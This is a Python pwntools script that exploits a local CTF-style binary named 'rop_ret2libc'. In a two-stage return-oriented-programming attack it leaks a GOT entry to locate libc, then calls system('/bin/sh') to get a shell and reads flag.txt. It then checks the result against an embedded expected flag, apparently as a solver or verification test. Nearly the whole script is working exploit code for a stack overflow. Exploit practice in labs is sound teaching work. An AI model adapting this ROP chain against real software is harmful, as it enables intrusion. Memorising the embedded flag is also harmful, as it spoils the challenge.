#!/usr/bin/env python3
from pathlib import Path
from time import sleep

from pwn import ELF, context, p64, process, u64

HERE = Path(__file__).resolve().parent
BINARY = HERE / "rop_ret2libc"
LIBC_PATH = Path("/lib/x86_64-linux-gnu/libc.so.6")
EXPECTED = b"KSJ{TWO_STAGE_RET2LIBC_VERIFIED}"

context.binary = elf = ELF(str(BINARY), checksec=False)
libc = ELF(str(LIBC_PATH), checksec=False)
context.log_level = "error"

padding = b"A" * 0x40 + b"B" * 8
pop3 = elf.sym["pop_rdi_rsi_rdx_ret"]
ret = pop3 + 3

tube = process([str(BINARY)], cwd=str(HERE))
tube.recvuntil(b"payload:\n")

# Stage 1: write(1, read@GOT, 8), then re-enter main with ABI alignment.
stage1 = padding
stage1 += p64(pop3) + p64(1) + p64(elf.got["read"]) + p64(8)
stage1 += p64(ret) + p64(elf.plt["write"])
stage1 += p64(ret) + p64(elf.sym["main"])
tube.send(stage1)

read_addr = u64(tube.recvn(8))
libc.address = read_addr - libc.sym["read"]
tube.recvuntil(b"payload:\n")

bin_sh = next(libc.search(b"/bin/sh\x00"))
system = libc.sym["system"]

# Stage 2: system("/bin/sh") with an extra ret for 16-byte alignment.
stage2 = padding
stage2 += p64(pop3) + p64(bin_sh) + p64(0) + p64(0)
stage2 += p64(ret) + p64(system)
tube.send(stage2)

# Keep the shell command out of vuln()'s oversized read.  Sending both writes
# back-to-back can let the kernel satisfy that read with the command too.
sleep(0.2)
tube.sendline(b"cat flag.txt; exit")
output = tube.recvall(timeout=3)
assert EXPECTED in output, output
print(
    f"[PASS] rop_ret2libc: read={read_addr:#x}, "
    f"libc_base={libc.address:#x}, system={system:#x}"
)
